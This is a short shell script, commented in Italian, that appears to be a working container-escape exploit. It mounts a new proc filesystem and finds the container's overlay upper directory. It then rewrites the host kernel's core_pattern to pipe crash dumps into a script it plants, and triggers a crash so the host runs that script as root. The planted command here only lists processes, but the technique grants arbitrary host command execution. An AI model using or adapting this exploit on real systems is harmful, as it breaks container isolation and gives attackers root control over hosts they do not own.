#!/bin/sh

#$1 è ip es.: 172.17.0.2
mkdir /newproc
mount -t proc proc /newproc
UPPERDIR=$(cat /etc/mtab | grep overlay | awk -F "," '{ for (i=1; i<=NF; i++) { if ($i ~ /upperdir/) { print $i } } }' | cut -d "=" -f 2)
echo "#!/bin/sh" > /cmd
echo "ps aux > $UPPERDIR/output;" >> /cmd
echo "echo crash!" >> /cmd
chmod 777 /cmd
echo "|$UPPERDIR/cmd" > /newproc/sys/kernel/core_pattern
./crash
